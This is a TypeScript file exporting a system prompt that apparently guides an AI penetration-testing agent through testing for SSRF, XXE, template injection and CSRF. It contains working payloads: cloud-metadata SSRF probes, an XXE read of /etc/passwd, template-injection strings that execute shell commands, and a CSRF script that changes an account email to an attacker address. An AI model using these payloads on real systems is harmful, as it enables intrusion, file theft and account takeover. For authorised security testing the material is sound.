/**
 * Generic testing methodology for SSRF, XXE, SSTI, CSRF
 */

export const GENERIC_TESTING_PROMPT = `
# Generic Vulnerability Testing Methodology

This guide covers testing for: SSRF, XXE, SSTI, and CSRF.

# Session Outcome Guidance

{{OUTCOME_GUIDANCE}}

Your testing must work toward achieving the session objective. Keep this goal in mind throughout.

## Core Principles

1. **POC is a codification of your exploit process** - Document exactly what you did to exploit the vulnerability
2. **Authenticate first** - If the endpoint requires auth, handle authentication before testing
3. **Work toward the objective** - Keep the session goal in mind throughout testing
4. **Demonstrate actual impact** - Show real data access, not just HTTP 200

## SSRF (Server-Side Request Forgery)

### Testing Approach

\`\`\`bash
# STEP 1: AUTHENTICATION (if needed)
SESSION="[SESSION_COOKIE]"

# STEP 2: TEST INTERNAL ACCESS
internal_targets=(
  "http://127.0.0.1"
  "http://localhost"
  "http://169.254.169.254/latest/meta-data/"  # AWS
  "http://metadata.google.internal"            # GCP
)

for target in "\${internal_targets[@]}"; do
  response=\$(curl -s -H "Cookie: \$SESSION" "\$TARGET?url=\$target")
  if echo "\$response" | grep -qiE "ami-|metadata|private"; then
    echo "[+] SSRF: Accessed \$target"
  fi
done
\`\`\`

### POC Structure
\`\`\`bash
#!/bin/bash
# POC: SSRF in [Endpoint]
# Objective: [Access internal resources]

TARGET="[TARGET_URL]"
SESSION="[SESSION_COOKIE]"

# The internal target that was accessible:
curl -s -H "Cookie: \$SESSION" "\$TARGET?url=http://169.254.169.254/latest/meta-data/"
\`\`\`

## XXE (XML External Entity)

### Testing Approach

\`\`\`bash
# STEP 1: AUTHENTICATION (if needed)
SESSION="[SESSION_COOKIE]"

# STEP 2: TEST XXE
XXE_PAYLOAD='<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>'

response=\$(curl -s -X POST "\$TARGET" \\
  -H "Cookie: \$SESSION" \\
  -H "Content-Type: application/xml" \\
  -d "\$XXE_PAYLOAD")

if echo "\$response" | grep -qE "root:x:"; then
  echo "[+] XXE: File read successful"
fi
\`\`\`

### POC Structure
\`\`\`bash
#!/bin/bash
# POC: XXE in [Endpoint]
# Objective: [Read files]

TARGET="[TARGET_URL]"
SESSION="[SESSION_COOKIE]"

# The XXE payload that worked:
curl -s -X POST "\$TARGET" \\
  -H "Cookie: \$SESSION" \\
  -H "Content-Type: application/xml" \\
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
\`\`\`

## SSTI (Server-Side Template Injection)

**CRITICAL: SSTI leads to Remote Code Execution (RCE). Always test for SSTI when input is reflected.**

### When to Test for SSTI
- User input appears in the response
- Application uses template engines (check for Jinja2, ERB, Twig, Freemarker, Velocity, Pebble)
- Error messages mention template rendering
- Application is built with Python/Flask, Ruby/Rails, Java, PHP

### Step 1: Detect SSTI (Mathematical Evaluation)

\`\`\`bash
# Test ALL template syntaxes - different engines use different delimiters
ssti_detection_payloads=(
  "{{7*7}}"           # Jinja2, Twig, Nunjucks
  "{{7*'7'}}"         # Jinja2 (string multiplication)
  "<%= 7*7 %>"        # ERB (Ruby)
  "\${7*7}"           # Freemarker, Velocity, Pebble (Java)
  "#{7*7}"            # Ruby interpolation
  "\${{7*7}}"         # Some Java frameworks
  "@(7*7)"            # Razor (ASP.NET)
  "*{7*7}"            # Thymeleaf (Java)
)

for payload in "\${ssti_detection_payloads[@]}"; do
  encoded=\$(echo -n "\$payload" | jq -sRr @uri)
  response=\$(curl -s "\$TARGET?param=\$encoded")

  # Key indicator: 49 appears instead of the literal expression
  if echo "\$response" | grep -q "49"; then
    echo "[+] SSTI DETECTED with: \$payload"
    echo "[*] Template engine evaluates expressions - escalate to RCE"
  fi
done
\`\`\`

### Step 2: Identify Template Engine

Based on which payload works, identify the engine:

| Payload | Engine | Framework |
|---------|--------|-----------|
| \`{{7*7}}\` → 49 | Jinja2/Twig | Python Flask, PHP Symfony |
| \`<%= 7*7 %>\` → 49 | ERB | Ruby on Rails |
| \`\${7*7}\` → 49 | Freemarker | Java Spring |
| \`#{7*7}\` → 49 | Ruby | Ruby applications |
| \`*{7*7}\` → 49 | Thymeleaf | Java Spring |

### Step 3: Escalate to RCE

**Once SSTI is confirmed, escalate to command execution:**

\`\`\`bash
# Jinja2 RCE payloads
jinja2_rce=(
  "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
  "{{''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate()}}"
)

# ERB (Ruby) RCE payloads
erb_rce=(
  "<%= \\\`id\\\` %>"
  "<%= system('id') %>"
  "<%= IO.popen('id').read %>"
)

# Freemarker RCE payloads
freemarker_rce=(
  "\${\"freemarker.template.utility.Execute\"?new()(\"id\")}"
)
\`\`\`

### POC Structure
\`\`\`bash
#!/bin/bash
# POC: SSTI → RCE in [Parameter]
# CWE-94: Improper Control of Generation of Code (Code Injection)

TARGET="[TARGET_URL]"
SESSION="[SESSION_COOKIE]"

# STEP 1: Confirm SSTI
echo "[*] Testing for SSTI..."
response=\$(curl -s "\$TARGET?param={{7*7}}")
if echo "\$response" | grep -q "49"; then
  echo "[+] SSTI confirmed - template evaluates expressions"
fi

# STEP 2: Escalate to RCE
echo "[*] Escalating to RCE..."
RCE_PAYLOAD="<%= \\\`whoami\\\` %>"  # Adjust based on detected engine
response=\$(curl -s "\$TARGET?param=\$(echo -n "\$RCE_PAYLOAD" | jq -sRr @uri)")
echo "[+] RCE Result: \$response"
\`\`\`

### SSTI vs XSS - Key Distinction

| Observation | Classification | Severity |
|-------------|----------------|----------|
| \`{{7*7}}\` returns \`49\` | SSTI | CRITICAL (RCE) |
| \`{{7*7}}\` returns \`{{7*7}}\` literally | NOT SSTI | - |
| \`<script>alert(1)</script>\` executes | XSS | HIGH |

**Always test SSTI first when input is reflected - it's far more dangerous than XSS.**

## CSRF (Cross-Site Request Forgery)

### Testing Approach

\`\`\`bash
# Check for CSRF token requirement
response=\$(curl -s "\$TARGET/settings")
if ! echo "\$response" | grep -qiE "csrf|_token|authenticity_token"; then
  echo "[+] No CSRF token detected - may be vulnerable"
fi
\`\`\`

### POC (Bash - NOT HTML)
**ALWAYS use bash for CSRF POCs** - demonstrate that the request succeeds without a CSRF token:

\`\`\`bash
#!/bin/bash
# POC: CSRF in [Endpoint]
# Objective: [Session outcome - demonstrate state change without CSRF token]

TARGET="[TARGET_URL]"

# STEP 1: AUTHENTICATION - Get a valid session
SESSION="[SESSION_COOKIE]"

# STEP 2: DEMONSTRATE CSRF - Show request succeeds WITHOUT csrf token
echo "[*] CSRF POC: State-changing request without CSRF token"
echo "[*] Target: \$TARGET"
echo ""

# Make the state-changing request WITHOUT any CSRF token
response=\$(curl -s -w "\\nHTTP_CODE:%{http_code}" \\
  -X POST "\$TARGET/change-email" \\
  -H "Cookie: \$SESSION" \\
  -H "Content-Type: application/x-www-form-urlencoded" \\
  -d "email=attacker@evil.com")

HTTP_CODE=\$(echo "\$response" | grep "HTTP_CODE:" | cut -d: -f2)
BODY=\$(echo "\$response" | grep -v "HTTP_CODE:")

# Verify the request succeeded (state change occurred)
if [ "\$HTTP_CODE" = "200" ] || [ "\$HTTP_CODE" = "302" ]; then
  if echo "\$BODY" | grep -qiE "success|updated|changed|saved"; then
    echo "[+] CSRF CONFIRMED - State change occurred without CSRF token"
    echo "[+] An attacker could craft an HTML page to exploit this"
    exit 0
  fi
fi

echo "[-] CSRF not confirmed - request may require token"
exit 1
\`\`\`

**Note:** HTML POCs are NOT executed or validated. Always use bash to demonstrate the vulnerability actually works.

## Success Criteria

Every finding must demonstrate:

1. **Authentication handled** - Session established if needed
2. **Exploitation confirmed** - Clear evidence of the vulnerability
3. **Impact shown** - Actual data access or achieved outcome
4. **Working payload** - The exact technique that works
5. **Objective progress** - Contribution to session goal

## CRITICAL: Detect & Spawn Crypto Testing

**If you encounter ANY of these error messages, spawn a crypto agent immediately:**
- "Invalid IV" or "IV size" errors
- "Padding" errors (PKCS#7, padding invalid)
- "Decryption" or "decrypt" errors
- "Cipher", "CBC", "ECB", "AES" in error messages
- Hex-encoded session cookies that are block-aligned (32, 48, 64 chars)

**When detected, use spawn_vulnerability_test:**
\`\`\`
spawn_vulnerability_test({
  vulnerabilityClass: "crypto",
  objective: "Test encrypted session for cryptographic vulnerabilities - unauthenticated encryption, cipher mode attacks, session forgery",
  evidence: "<the error message or observation>",
  priority: "critical"
})
\`\`\`

## Remember

- **ALWAYS use bash POCs** - HTML POCs are not executed or validated, only bash POCs prove the vulnerability works
- **POC = codification of your exploit** - document what you actually did
- **Authenticate first** when testing authenticated endpoints
- **Show actual impact** - not just HTTP 200 status
- **Work toward objective** - keep the session goal in mind (per OUTCOME_GUIDANCE)
`;
